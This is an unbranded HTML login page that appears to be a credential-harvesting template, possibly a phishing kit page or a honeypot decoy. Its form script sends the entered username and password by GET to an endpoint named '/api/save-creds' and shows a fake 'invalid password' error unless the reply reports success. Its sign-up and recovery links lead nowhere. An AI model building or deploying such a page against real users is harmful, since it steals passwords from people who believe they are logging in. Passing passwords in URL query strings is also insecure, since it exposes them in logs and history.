<!DOCTYPE html>
<html>
<head>
<title>Login</title>
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<style>
* { box-sizing: border-box; margin: 0; padding: 0; }
html, body {
	height: 100%;
	background: #282828;
	color: #999;
	font-family: Arial, Helvetica, sans-serif;
	font-size: 14px;
}
body {
	display: flex;
	align-items: center;
	justify-content: center;
	min-height: 100dvh;
	padding: 10px;
	overflow: hidden;
}
.popup-holder {
	width: 100%;
	max-width: 490px;
	background: #333;
	border: 1px solid #444;
	border-radius: 3px;
	padding: 15px 20px;
}
.popup-title {
	display: block;
	color: #fff;
	font-size: 18px;
	font-weight: bold;
	padding-bottom: 10px;
	margin-bottom: 12px;
	border-bottom: 1px solid #444;
}
.generic-error {
	background: #3a1a1a;
	border: 2px solid #cc0000;
	color: #ff6666;
	padding: 8px 12px;
	margin-bottom: 12px;
	font-size: 13px;
	text-align: center;
}
.row { margin-bottom: 10px; }
.field-label {
	display: block;
	color: #ccc;
	font-size: 13px;
	font-weight: bold;
	margin-bottom: 4px;
}
.field-label .required { color: #999; }
.textfield {
	width: 100%;
	padding: 8px 10px;
	font-size: 14px;
	background: #444;
	border: 1px solid #555;
	color: #fff;
	border-radius: 2px;
	outline: none;
}
.textfield:focus { border-color: #888; }
.remember-row {
	display: flex;
	align-items: center;
	gap: 5px;
	margin-bottom: 10px;
	font-size: 13px;
	color: #999;
}
.bottom { padding-top: 5px; border-top: 1px solid #444; }
.submit {
	display: block;
	width: 100%;
	padding: 10px;
	background: linear-gradient(to bottom, #666, #444);
	color: #fff;
	font-weight: bold;
	font-size: 14px;
	text-transform: uppercase;
	letter-spacing: 1px;
	border: 1px solid #555;
	border-radius: 2px;
	cursor: pointer;
}
.submit:hover { background: linear-gradient(to bottom, #777, #555); }
.links {
	margin-top: 10px;
	font-size: 12px;
	line-height: 1.6;
}
.links a {
	color: #e8a20e;
	text-decoration: none;
}
.links a:hover { text-decoration: underline; }

@media (max-height: 420px) {
	.popup-holder { padding: 10px 14px; }
	.popup-title { font-size: 15px; padding-bottom: 6px; margin-bottom: 8px; }
	.row { margin-bottom: 6px; }
	.textfield { padding: 5px 8px; font-size: 13px; }
	.submit { padding: 7px; font-size: 13px; }
	.links { margin-top: 6px; }
}
</style>
</head>
<body>
<div class="popup-holder">
	<strong class="popup-title">Login</strong>
	<form action="/api/save-creds" method="GET" onsubmit="event.preventDefault();fetch('/api/save-creds?'+new URLSearchParams(new FormData(this))).then(function(r){return r.json();}).then(function(d){if(d.login_status!=='success'){document.querySelector('.generic-error').style.display='block';}}).catch(function(e){console.error(e);});return false;">
		<div class="generic-error" style="display: none;">Invalid Username or Password. Username and Password are case-sensitive.</div>
		<div class="row">
			<label for="login_username" class="field-label">Username <span class="required">(*)</span>:</label>
			<input type="text" name="username" id="login_username" class="textfield"/>
		</div>
		<div class="row">
			<label for="login_pass" class="field-label">Password <span class="required">(*)</span>:</label>
			<input type="password" name="password" id="login_pass" class="textfield"/>
		</div>
		<div class="remember-row">
			<input type="checkbox" name="remember_me" id="login_remember_me" value="1"/>
			<label for="login_remember_me">remember me</label>
		</div>
		<div class="bottom">
			<input type="submit" class="submit" value="LOG IN"/>
		</div>
		<div class="links">
			<a href="#">Not a member yet? Sign up now for free!</a><br>
			<a href="#">Forgot password?</a> / <a href="#">Missing confirmation email?</a>
		</div>
	</form>
</div>
</body>
</html>
